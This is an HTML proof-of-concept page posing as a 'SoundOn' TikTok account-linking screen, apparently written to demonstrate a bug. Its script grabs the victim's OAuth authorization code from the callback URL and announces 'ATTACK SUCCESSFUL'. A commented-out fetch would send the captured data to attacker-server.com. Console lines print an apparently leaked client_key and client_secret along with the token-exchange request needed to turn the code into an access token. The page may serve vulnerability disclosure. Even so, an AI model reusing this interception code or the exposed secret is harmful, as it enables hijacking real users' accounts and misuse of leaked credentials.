<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SoundOn — Connecting your account...</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
.card { background: #111; border-radius: 16px; padding: 48px; max-width: 480px; width: 90%; text-align: center; border: 1px solid #222; }
.spinner { margin: 20px auto; border: 3px solid #333; border-top: 3px solid #ff0050; border-radius: 50%; width: 48px; height: 48px; animation: spin 0.8s linear infinite; }
@keyframes spin { to { transform: rotate(360deg); } }
h2 { margin-top: 16px; font-size: 20px; }
p { color: #888; margin-top: 8px; font-size: 14px; }
.code-box { background: #1a1a1a; border-radius: 8px; padding: 16px; margin-top: 16px; font-family: monospace; font-size: 13px; word-break: break-all; color: #0f0; display: none; }
.success { color: #0f0; display: none; }
.error { color: #ff0050; margin-top: 16px; display: none; }
</style>
</head>
<body>
<div class="card">
<div class="spinner" id="spinner"></div>
<h2 id="status">Connecting your TikTok account...</h2>
<p id="message">Please wait while we link your account</p>
<div class="code-box" id="codeBox"></div>
<div class="success" id="success"></div>
<div class="error" id="errorMsg"></div>
</div>

<script>
// === PoC: OAuth Callback Handler ===
// This page receives the OAuth authorization code from TikTok
// In a real attack, this silently exfiltrates the code to the attacker's server

(async function() {
  const params = new URLSearchParams(window.location.search);
  const code = params.get("code");
  const state = params.get("state");
  const error = params.get("error");
  const errorDescription = params.get("error_description");

  // Store evidence
  const capturedData = {
    timestamp: new Date().toISOString(),
    code: code,
    state: state,
    error: error,
    error_description: errorDescription,
    url: window.location.href,
    userAgent: navigator.userAgent
  };

  // Display the captured code as PoC evidence
  if (code) {
    document.getElementById("spinner").style.display = "none";
    document.getElementById("status").textContent = "Authorization Code Captured!";
    document.getElementById("message").textContent = 
      "PoC Evidence — This code can be exchanged for a TikTok access token";
    document.getElementById("codeBox").style.display = "block";
    document.getElementById("codeBox").textContent = 
      "Authorization Code: " + code + "\nState: " + state;
    document.getElementById("success").style.display = "block";
    document.getElementById("success").textContent = 
      "ATTACK SUCCESSFUL: The victim's OAuth authorization code has been intercepted.";
  } else if (error) {
    document.getElementById("spinner").style.display = "none";
    document.getElementById("status").textContent = "Authorization Failed";
    document.getElementById("errorMsg").style.display = "block";
    document.getElementById("errorMsg").textContent = 
      "Error: " + error + " — " + (errorDescription || "No description");
    document.getElementById("codeBox").style.display = "block";
    document.getElementById("codeBox").textContent = JSON.stringify(capturedData, null, 2);
  } else {
    document.getElementById("status").textContent = "Waiting for callback...";
    document.getElementById("message").textContent = "No OAuth parameters detected in URL";
  }

  // === EXFILTRATION (simulated for PoC) ===
  // In a real attack, this sends the code to the attacker's backend:
  // fetch("https://attacker-server.com/collect", {
  //   method: "POST",
  //   body: JSON.stringify(capturedData),
  //   mode: "no-cors"
  // });

  // Log evidence to console for PoC screenshot
  console.log("%c[PoC] TikTok OAuth Code Captured", "color: red; font-size: 20px;");
  console.log(JSON.stringify(capturedData, null, 2));
  console.log(
    "%cNext step: Exchange this code using the leaked client_secret",
    "color: orange; font-size: 14px;"
  );
  console.log(
    "%cPOST https://open-api.tiktok.com/oauth/access_token/\n" +
    '{"client_key":"awulj3e36brrh086","client_secret":"e63acb9afab646ee9340f16a2380b1ed","code":"' + 
    (code || "CODE_HERE") + '","grant_type":"authorization_code"}',
    "color: cyan;"
  );
})();
</script>
</body>
</html>
